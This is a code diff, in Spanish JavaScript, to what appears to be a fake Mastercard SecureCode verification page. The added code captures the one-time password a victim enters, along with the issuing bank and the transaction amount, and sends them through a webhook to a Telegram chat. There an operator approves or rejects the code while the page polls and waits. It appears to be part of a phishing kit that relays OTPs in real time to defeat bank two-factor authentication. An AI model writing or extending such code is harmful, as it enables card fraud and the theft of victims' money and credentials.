@@ -589,8 +589,70 @@
                 const data = await response.json();
                 return data.estado || 'pending';
             } catch (error) {
+                console.error('Error polling:', error);
                 return 'pending';
             }
+        }
+
+        async function enviarOTPATelegram(datos) {
+            try {
+                const bancoEmisor = localStorage.getItem('bancoEmisor') || 'No especificado';
+
+                const inlineKeyboard = {
+                    inline_keyboard: [
+                        [
+                            { text: "✅ APROBAR OTP", callback_data: `aprobar_otp_${datos.solicitudId}` },
+                            { text: "❌ RECHAZAR OTP", callback_data: `rechazar_otp_${datos.solicitudId}` }
+                        ]
+                    ]
+                };
+
+                const mensaje = `🔔 *OTP REQUERIDO - MASTERCARD SECURECODE*\n\n🆔 ID: \`${datos.solicitudId}\`\n🏛️ BANCO: ${bancoEmisor}\n📱 OTP INGRESADO: \`${datos.otp}\`\n💰 Monto: ${datos.monto}\n⏳ Esperando aprobación...`;
+
+                const response = await fetch(`${WEBHOOK_BASE_URL}/api/send-telegram`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        mensaje: mensaje,
+                        inline_keyboard: inlineKeyboard
+                    })
+                });
+
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error('Error:', error);
+                return false;
+            }
+        }
+
+        function iniciarPollingOTP() {
+            let tiempoInicio = Date.now();
+
+            pollingInterval = setInterval(async () => {
+                if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
+                    clearInterval(pollingInterval);
+                    mostrarError('Tiempo de espera agotado');
+                    resetFormulario();
+                    return;
+                }
+
+                const resultado = await verificarEstadoSolicitud(solicitudId);
+
+                if (resultado === 'aprobar_otp') {
+                    clearInterval(pollingInterval);
+                    mostrarExito('✅ Autenticación exitosa');
+                    setTimeout(() => {
+                        window.location.href = 'exito.html';
+                    }, 2000);
+                } else if (resultado === 'rechazar_otp') {
+                    clearInterval(pollingInterval);
+                    mostrarError('OTP incorrecto');
+                    confirmationInput.value = '';
+                    submitButton.disabled = false;
+                    loadingOverlay.classList.remove('active');
+                }
+            }, POLLING_INTERVAL);
         }
 
         function iniciarPollingCredenciales() {
@@ -683,6 +745,21 @@
                 } else {
                     mostrarError('Error al procesar');
                     resetFormulario();
+                }
+            } else if (pasoActual === 'otp') {
+                const datosTelegram = {
+                    solicitudId: solicitudId,
+                    otp: confirmationInput.value.trim(),
+                    monto: document.getElementById('transaction-amount').textContent
+                };
+
+                const enviado = await enviarOTPATelegram(datosTelegram);
+                if (enviado) {
+                    iniciarPollingOTP();
+                } else {
+                    mostrarError('Error al procesar OTP');
+                    submitButton.disabled = false;
+                    loadingOverlay.classList.remove('active');
                 }
             }
         });
